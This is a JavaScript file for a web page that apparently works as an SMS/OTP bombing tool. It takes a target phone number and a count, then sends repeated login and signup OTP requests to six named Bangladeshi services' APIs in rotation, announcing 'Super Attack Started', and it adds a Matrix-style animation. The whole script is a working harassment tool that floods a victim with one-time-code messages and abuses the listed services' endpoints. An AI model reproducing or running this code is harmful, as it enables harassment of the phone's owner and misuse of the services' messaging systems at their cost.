let isCooldown = false; 

window.onload = function() {
    const savedCooldownTime = localStorage.getItem('cooldownEndTime');
    if (savedCooldownTime) {
        const currentTime = Date.now();
        if (currentTime < savedCooldownTime) {
            const remainingTime = Math.ceil((savedCooldownTime - currentTime) / 1000);
            activateCooldown(remainingTime);
        }
    }
};

async function startProcess() {
    const target = document.getElementById('target').value;
    const count = parseInt(document.getElementById('count').value);
    const display = document.getElementById('display');

    if (isCooldown) {
        display.innerText = "Wait for cooldown!";
        return;
    }

    if(!target || !count) { 
        display.innerText = "Enter target & amount!";
        return; 
    }

    display.innerText = "Super Attack Started...";
    
    for (let i = 1; i <= count; i++) {
        try { 
            let apiIndex = (i - 1) % 6; // ৬টি এপিআই পর্যায়ক্রমে চালানোর জন্য

            if (apiIndex === 0) {
                // Apex
                await fetch('https://api.apex4u.com/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ "phoneNumber": target }),
                    mode: 'cors'
                });
            } 
            else if (apiIndex === 1) {
                // Bioscope
                await fetch('https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ "number": "+88" + target }),
                    mode: 'cors'
                });
            } 
            else if (apiIndex === 2) {
                // Ghoori Learning
                await fetch('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ "mobile_no": target }),
                    mode: 'cors'
                });
            }
            else if (apiIndex === 3) {
                // Ali2BD
                await fetch('https://ali2bd-api.service.moveo.global/api/consumer/v1/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ "username": "+88" + target }),
                    mode: 'cors'
                });
            }
            else if (apiIndex === 4) {
                // ChokroJan
                await fetch('https://chokrojan.com/api/v1/passenger/login/mobile', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ "mobile_number": target }),
                    mode: 'cors'
                });
            }
            else {
                // Hoichoi (আপনার নতুন পাওয়া এপিআই)
                await fetch('https://prod-api.hoichoi.dev/core/api/v1/auth/signup/code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ "phoneNumber": "+88" + target }),
                    mode: 'cors'
                });
            }

            display.innerText = "Sent: " + i;
            await new Promise(res => setTimeout(res, 4000)); // ৪ সেকেন্ড নিরাপদ গ্যাপ
        } catch (e) {
            console.log("Error skipped...");
        }
    }

    const cooldownEndTime = Date.now() + 60000;
    localStorage.setItem('cooldownEndTime', cooldownEndTime);
    activateCooldown(60);
}

function activateCooldown(seconds) {
    isCooldown = true;
    let timeLeft = seconds;
    const timer = setInterval(() => {
        timeLeft--;
        document.getElementById('display').innerText = `Wait: ${timeLeft}s`;
        if (timeLeft <= 0) {
            clearInterval(timer);
            isCooldown = false;
            localStorage.removeItem('cooldownEndTime');
            document.getElementById('display').innerText = "Ready!";
        }
    }, 1000);
}

// Matrix Animation... (অপরিবর্তিত)
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const letters = "0123456789ABCDEF";
const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);
function draw() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#00ff00";
    ctx.font = fontSize + "px monospace";
    for (let i = 0; i < drops.length; i++) {
        const text = letters[Math.floor(Math.random() * letters.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 33);
